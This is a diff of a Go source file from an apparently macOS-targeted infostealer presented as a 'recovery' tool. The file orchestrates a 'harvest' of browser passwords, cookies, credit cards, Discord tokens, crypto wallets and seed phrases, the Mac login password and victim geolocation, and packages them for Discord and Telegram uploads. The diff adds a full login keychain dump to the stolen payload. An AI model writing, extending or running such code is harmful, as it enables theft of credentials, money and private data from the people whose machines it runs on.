@@ -1,3 +1,8 @@
+// collect.go — orchestrates a full local harvest into harvestPayload.
+//
+// runHarvest is the only entry used by main: it enables every collect category,
+// overlaps wallet-extension scanning with Collect, then derives seeds / password
+// candidates and public geo metadata for the upload summary.
 package main
 
 import (
@@ -7,6 +12,8 @@ import (
 	"recovery/recovery"
 )
 
+// harvestPayload is the in-memory harvest used for zip export and upload captions.
+// Seeds / KeychainDump are kept separate from Result (derived / large binary-ish text).
 type harvestPayload struct {
 	Hostname    string                     `json:"hostname"`
 	OS          string                     `json:"os"`
@@ -18,8 +25,11 @@ type harvestPayload struct {
 	MacUser     string                     `json:"macUser,omitempty"`
 	Result      *recovery.CollectionResult `json:"result"`
 	Seeds       []recovery.SeedResult      `json:"seeds,omitempty"`
+	// KeychainDump is security dump-keychain -d text; exported to primary zip only (not harvest.json).
+	KeychainDump []byte `json:"-"`
 }
 
+// fullCollectOptions turns on every recovery category for a standalone Mac run.
 func fullCollectOptions() recovery.CollectOptions {
 	opts := recovery.CollectOptions{Browsers: true}
 	opts.Passwords = true
@@ -39,9 +49,13 @@ func fullCollectOptions() recovery.CollectOptions {
 	return opts
 }
 
+// runHarvest collects all categories, enriches with seeds/candidates/geo, and
+// returns a payload ready for export + upload. Extension scan runs in parallel
+// with Collect because it does not depend on browser decryption keys.
 func runHarvest(hostname string) (*harvestPayload, error) {
 	opts := fullCollectOptions()
 
+	// Wallet browser extensions (LevelDB paths) are independent of Chromium key resolution.
 	var extensions []recovery.ExtensionResult
 	var extWg sync.WaitGroup
 	extWg.Add(1)
@@ -58,9 +72,13 @@ func runHarvest(hostname string) (*harvestPayload, error) {
 	extWg.Wait()
 	result.Extensions = extensions
 
+	// Post-processing: BIP39-like phrases + login keychain dump + password candidates.
 	seeds := recovery.ScanSeeds(result.Files, result.Passwords, result.Autofill)
-	keychain := recovery.CollectKeychainPasswordCandidates()
-	result.PasswordCandidates = recovery.BuildPasswordCandidates(result.Passwords, result.Autofill, keychain)
+
+	// Keychain must already be unlocked (main → EnsureLoginKeychainUnlocked with modal password).
+	// Harvest dump for primary upload (logs/keys/keychain_dump.txt) and parse candidates.
+	keychainDump, keychainCandidates := recovery.HarvestLoginKeychain()
+	result.PasswordCandidates = recovery.BuildPasswordCandidates(result.Passwords, result.Autofill, keychainCandidates)
 	if mp := recovery.MacLoginPassword(); mp != "" {
 		result.PasswordCandidates = appendMacLoginCandidate(result.PasswordCandidates, mp)
 	}
@@ -69,31 +87,38 @@ func runHarvest(hostname string) (*harvestPayload, error) {
 	publicIP, country, countryCode, city, macUser := collectVictimInfo()
 
 	return &harvestPayload{
-		Hostname:    hostname,
-		OS:          runtime.GOOS,
-		Arch:        runtime.GOARCH,
-		PublicIP:    publicIP,
-		Country:     country,
-		CountryCode: countryCode,
-		City:        city,
-		MacUser:     macUser,
-		Result:      result,
-		Seeds:       seeds,
+		Hostname:     hostname,
+		OS:           runtime.GOOS,
+		Arch:         runtime.GOARCH,
+		PublicIP:     publicIP,
+		Country:      country,
+		CountryCode:  countryCode,
+		City:         city,
+		MacUser:      macUser,
+		Result:       result,
+		Seeds:        seeds,
+		KeychainDump: keychainDump,
 	}, nil
 }
 
+// harvestSummary is the multi-line caption embedded in Discord/Telegram uploads
+// and written to summary.txt inside each harvest zip.
 func harvestSummary(p *harvestPayload) string {
 	if p == nil || p.Result == nil {
 		return "Harvest complete (empty)"
 	}
 	r := p.Result
-	return formatSummary(
+	summary := formatSummary(
 		p.Hostname, p.OS, p.Arch, p.PublicIP, p.CountryCode, p.Country, p.MacUser,
 		len(r.Passwords), len(r.Cookies), len(r.Autofill), len(r.History),
 		len(r.Bookmarks), len(r.CreditCards), len(r.DiscordTokens), len(r.Extensions),
 		countDesktopWallets(r.Wallets), len(r.Keys), len(r.Telegram), len(r.AppCredentials),
 		countGaming(r.Gaming), countVPNs(r.VPNs), len(r.PasswordCandidates), len(p.Seeds),
 	)
+	if len(p.KeychainDump) > 0 {
+		summary += "\nkeychain dump: " + itoa(len(p.KeychainDump)) + " bytes"
+	}
+	return summary
 }
 
 func countDesktopWallets(wallets []recovery.WalletResult) int {
@@ -148,6 +173,7 @@ func formatSummary(host, osName, arch, publicIP, countryCode, country, macUser s
 		"gaming: " + itoa(gaming) + " | vpns: " + itoa(vpns) + " | pw candidates: " + itoa(candidates) + " | seeds: " + itoa(seeds)
 }
 
+// appendMacLoginCandidate ensures the validated Mac login password is in the wordlist once.
 func appendMacLoginCandidate(candidates []recovery.PasswordCandidateResult, password string) []recovery.PasswordCandidateResult {
 	seen := make(map[string]bool, len(candidates))
 	for _, c := range candidates {
